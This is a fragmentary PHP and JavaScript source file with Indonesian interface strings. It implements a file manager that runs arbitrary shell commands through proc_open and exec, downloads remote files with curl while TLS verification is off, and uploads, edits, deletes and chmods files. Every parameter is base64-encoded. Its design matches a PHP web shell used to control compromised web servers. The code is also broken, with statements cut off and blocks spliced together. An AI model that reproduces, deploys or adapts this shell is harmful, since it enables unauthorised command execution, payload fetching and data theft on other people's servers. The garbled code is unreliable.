function formatSize($bytes) {
    if ($bytes === false) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getPerms($file) {
    clearstatcache();
    return substr(sprintf('%o', fileperms($file)), -4);
}

function getPermsColor($file) {
    return is_writable($file) ? '#10b981' : '#ef4444';

        $filename = base64_decode($_POST['filename_b64']);

        $save_as = !empty($save_as_b64) ? base64_decode($save_as_b64) : basename(parse_url($url, PHP_URL_PATH));
        if (empty($save_as)) $save_as = "downloaded_" . time() . ".txt";
        $target = $current_dir . '/' . $save_as;
        $ch = curl_init($url);
        $fp = @fopen($target, 'wb');
        if ($fp) {
            curl_setopt_array($ch, [
                CURLOPT_FILE => $fp,
                CURLOPT_HEADER => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0'
            ]);
            curl_exec($ch);
            $error = curl_error($ch);
            curl_close($ch);
            fclose($fp);
            if (empty($error)) {
                $message = "Download OK";
            } else {
                $message = "Gagal: " . $error;
                $message_type = "error";
                @unlink($target);
            }
        } else {
            $message = "Gagal buat file";
            $message_type = "error";
        }

        // Bersihkan nama file (hindari path traversal)
        $file_name = basename($file_name);
        $new_file = $current_dir . '/' . $file_name;
        
        if (empty($file_name)) {
            $message = "Nama file tidak boleh kosong";
            $message_type = "error";
        } elseif (!is_writable($current_dir)) {
            $message = "Folder tidak memiliki izin tulis, tidak bisa membuat file";
            $message_type = "error";
        } elseif (file_exists($new_file)) {

            $message_type = "error";

            $created = @file_put_contents($new_file, '');

                $message = "✅ File '$file_name' berhasil dibuat";
                $message_type = "success";
            } else {
                $message = "❌ Gagal membuat file (periksa batasan hosting atau izin folder)";

            $return_var = 1;
        } else {
            if (preg_match('/^\s*wget\s+/i', $cmd)) {
                $check_wget = @shell_exec('which wget 2>/dev/null');
                if (empty(trim($check_wget))) {
                    $url_part = preg_replace('/^\s*wget\s+/i', '', $cmd);
                    $cmd = 'curl -O ' . $url_part;
                    $_SESSION['cmd_note'] = "⚠️ wget tidak tersedia, menggunakan curl sebagai pengganti.";
                }
            }
            
            $descriptorspec = [
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = @proc_open($cmd, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $stdout = stream_get_contents($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                $return_var = proc_close($process);
                $result = trim($stdout . "\n" . $stderr);
            } else {
                $output = [];
                exec($cmd . ' 2>&1', $output, $return_var);
                $result = implode("\n", $output);
            }
            
            if ($return_var !== 0 && empty($result)) {
                $result = "Error: perintah gagal dijalankan.\nPerintah: $cmd\n\nCek: \n- Apakah fungsi exec() diaktifkan?\n- Apakah command tersedia di sistem?";
            }
        }

            unset($_SESSION['cmd_note']);

<script>
function showModal(id){document.getElementById(id).style.display='flex';}
function hideModal(id){document.getElementById(id).style.display='none';}
function cd(b64path){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="cd_b64"><input name="payload_b64" value="'+b64path+'">';document.body.appendChild(f);f.submit();}
function editFile(b64file){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="open_edit_b64"><input name="payload_b64" value="'+b64file+'">';document.body.appendChild(f);f.submit();}
function deleteItem(b64target){if(confirm('Hapus permanen?')){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="delete_b64"><input name="target_b64" value="'+b64target+'">';document.body.appendChild(f);f.submit();}}
function renameItem(b64old){var newname=prompt('Nama baru:');if(newname){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="rename_b64"><input name="old_name_b64" value="'+b64old+'"><input name="new_name_b64" value="'+btoa(newname)+'">';document.body.appendChild(f);f.submit();}}
function chmodItem(b64target){var perms=prompt('Permission (contoh: 0755):','0755');if(perms){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="chmod_b64"><input name="target_b64" value="'+b64target+'"><input name="perms" value="'+perms+'">';document.body.appendChild(f);f.submit();}}
function uploadFile(){var file=document.getElementById('uploadFile').files[0];if(!file){alert('Pilih file');return;}var r=new FileReader();r.onload=function(e){var b64=btoa(e.target.result);var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="upload_b64"><input name="filename_b64" value="'+btoa(file.name)+'"><input name="file_data_b64" value="'+b64+'">';document.body.appendChild(f);f.submit();};r.readAsBinaryString(file);}
function fetchUrl(){var url=document.getElementById('fetchUrl').value;if(!url){alert('Masukkan URL');return;}var saveAs=document.getElementById('saveAs').value;var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="curl_download_b64"><input name="url_b64" value="'+btoa(url)+'"><input name="save_as_b64" value="'+btoa(saveAs)+'">';document.body.appendChild(f);f.submit();}
function createFolder(){var name=document.getElementById('folderName').value;if(!name){alert('Masukkan nama folder');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_folder"><input name="folder_name_b64" value="'+btoa(name)+'">';document.body.appendChild(f);f.submit();}
function createFile(){var name=document.getElementById('fileName').value;if(!name.trim()){alert('Masukkan nama file');return;} var utf8Name = unescape(encodeURIComponent(name)); var b64Name = btoa(utf8Name); var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="new_file"><input name="file_name_b64" value="'+b64Name+'">';document.body.appendChild(f);f.submit();}
function closeEditor(){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="sys_action" value="close_edit">';document.body.appendChild(f);f.submit();}
function runCommand(){var cmd=document.getElementById('commandInput').value;if(!cmd.trim()){alert('Masukkan perintah');return;}var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="run_command"><input name="cmd_b64" value="'+btoa(cmd)+'">';document.body.appendChild(f);f.submit();}
function copyCommandOutput() { var pre = document.getElementById('cmdOutputText'); var text = pre.innerText; if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(function() { showCopyFeedback(true); }).catch(function() { fallbackCopy(text); }); } else { fallbackCopy(text); } }
function fallbackCopy(text) { var textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); document.body.removeChild(textarea); showCopyFeedback(true); }
function showCopyFeedback(success) { var btn = document.querySelector('.copy-btn'); if (success) { btn.innerHTML = '<i class="fas fa-check"></i> Copied!'; setTimeout(function() { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 1500); } else { btn.innerHTML = '<i class="fas fa-times"></i> Gagal'; setTimeout(function() { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 1500); } }
